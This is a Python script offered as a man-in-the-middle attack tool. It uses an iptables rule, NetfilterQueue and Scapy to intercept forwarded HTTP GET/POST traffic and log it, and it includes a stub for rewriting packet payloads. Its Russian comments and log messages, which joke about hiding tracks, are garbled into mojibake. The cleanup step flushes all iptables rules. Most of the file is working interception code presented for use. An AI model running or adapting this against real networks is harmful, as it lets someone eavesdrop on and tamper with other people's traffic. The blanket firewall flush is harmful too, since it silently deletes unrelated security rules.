"""
MITM-Attack-Example

–≠—Ç–æ—Ç –ø—Ä–æ–µ–∫—Ç –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç –∞—Ç–∞–∫—É –º–µ—Ç–æ–¥–æ–º "–ß–µ–ª–æ–≤–µ–∫ –ø–æ—Å–µ—Ä–µ–¥–∏–Ω–µ" (MITM) —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Python.
–°–∫—Ä–∏–ø—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –∏ –∏–∑–º–µ–Ω—è–µ—Ç —Å–µ—Ç–µ–≤–æ–π —Ç—Ä–∞—Ñ–∏–∫ –º–µ–∂–¥—É –¥–≤—É–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º–∏, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å
–ø—Ä–æ—á–∏—Ç–∞—Ç—å –∏ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ, –∫–∞–∫ –Ω–∞—Å—Ç–æ—è—â–∏–π —Ö–∞–∫–µ—Ä –∏–∑ –∫–∏–Ω–æ.

–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö –∏ –Ω–µ –Ω–∞—Ä—É—à–∞–π—Ç–µ –∑–∞–∫–æ–Ω! ü´°
–ü–æ–º–Ω–∏—Ç–µ: —Å –≤–µ–ª–∏–∫–æ–π —Å–∏–ª–æ–π –ø—Ä–∏—Ö–æ–¥–∏—Ç –≤–µ–ª–∏–∫–∞—è –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å. üôè


–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã:
1. –ü–µ—Ä–µ—Ö–≤–∞—Ç –ø–∞–∫–µ—Ç–æ–≤ —Å –ø–æ–º–æ—â—å—é Scapy.
2. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞–∫–µ—Ç–æ–≤ —Å –ø–æ–º–æ—â—å—é NetfilterQueue.
3. –ù–∞—Å—Ç—Ä–æ–π–∫–∞ iptables –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ç—Ä–∞—Ñ–∏–∫–∞.

–ó–∞–ø—É—Å–∫:
1. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ iptables:
   sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
2. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–∫—Ä–∏–ø—Ç:
   sudo python3 mitm_attack.py

–û—Å—Ç–∞–Ω–æ–≤–∫–∞:
–ü—Ä–µ—Ä–≤–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ (Ctrl + C). –°–∫—Ä–∏–ø—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—á–∏—Å—Ç–∏—Ç –ø—Ä–∞–≤–∏–ª–∞ iptables.

–ê–≤—Ç–æ—Ä: 41yn14
"""

import logging
import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import subprocess

# –°–æ–∑–¥–∞—ë–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –¥–ª—è –ª–æ–≥–æ–≤, –µ—Å–ª–∏ –µ—ë –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
os.makedirs("logs", exist_ok=True)

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è, —á—Ç–æ–±—ã –º—ã –≤—ã–≥–ª—è–¥–µ–ª–∏ –∫–∞–∫ –Ω–∞—Å—Ç–æ—è—â–∏–µ –ø—Ä–æ—Ñ–∏
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/mitm_attack.log"),
        logging.StreamHandler()
    ]
)

def process_packet(packet):
    try:
        scapy_packet = IP(packet.get_payload())

        if scapy_packet.haslayer(Raw):
            payload = scapy_packet[Raw].load
            if b"GET" in payload or b"POST" in payload:
                logging.info("[*] –ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ")
                # –ü—Ä–∏–º–µ—Ä –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –ø–∞–∫–µ—Ç–∞
                # payload = payload.replace(b"original", b"modified")
                scapy_packet[Raw].load = payload
                # –£–¥–∞–ª—è–µ–º –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã, —á—Ç–æ–±—ã —Å–µ—Ç—å –Ω–∞—Å –Ω–µ —Ä–∞—Å–∫—É—Å–∏–ª–∞
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(bytes(scapy_packet))

        packet.accept()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–∞–∫–µ—Ç–∞: {e}. –ü–∞–∫–µ—Ç —É–Ω–∏—á—Ç–æ–∂–µ–Ω, –Ω–µ –ø–∞–ª–∏–º—Å—è, –∑–∞–º–µ—Ç–∞–µ–º —Å–ª–µ–¥—ã")
        packet.drop()

def setup_iptables():
    try:
        subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"], check=True)
        logging.info("iptables –ø—Ä–∞–≤–∏–ª–∞ —É—Å–ø–µ—à–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã. –í–æ—Ä–æ—Ç–∞ –æ—Ç–∫—Ä—ã—Ç—ã, –¥–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!")
    except subprocess.CalledProcessError as e:
        logging.error(f"üõë –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å iptables: {e}. –û—Ç–≤–∞–ª–∏–≤–∞–µ–º! ((")
        exit(1)

def flush_iptables():
    try:
        subprocess.run(["sudo", "iptables", "--flush"], check=True)
        logging.info("iptables –ø—Ä–∞–≤–∏–ª–∞ —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω—ã. –°–ª–µ–¥—ã –∑–∞–º–µ—Ç–µ–Ω—ã, –º–æ–∂–Ω–æ —Å–ø–∞—Ç—å —Å–ø–æ–∫–æ–π–Ω–æ.")
    except subprocess.CalledProcessError as e:
        logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—á–∏—Å—Ç–∏—Ç—å iptables: {e}. –ü–æ—Ö–æ–∂–µ, –∑–∞ –Ω–∞–º–∏ —É–∂–µ –≤—ã–µ—Ö–∞–ª–∏! üö®")

def main():
    setup_iptables()
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    try:
        logging.info("–ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏... –ß—ë—Ä–Ω—ã–µ –æ—á–∫–∏ –Ω–∞–¥–µ—Ç—ã üòé! –ø–æ–µ—Ö–∞–ª–∏!üöÄ")
        queue.run()
    except KeyboardInterrupt:
        logging.info("–ê—Ç–∞–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º. üíî")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {e}. –ö—Ç–æ-—Ç–æ —è–≤–Ω–æ –ø–æ–º–µ—à–∞–ª –Ω–∞—à–∏–º –ø–ª–∞–Ω–∞–º! üëæ")
    finally:
        flush_iptables()

if __name__ == "__main__":
    main()
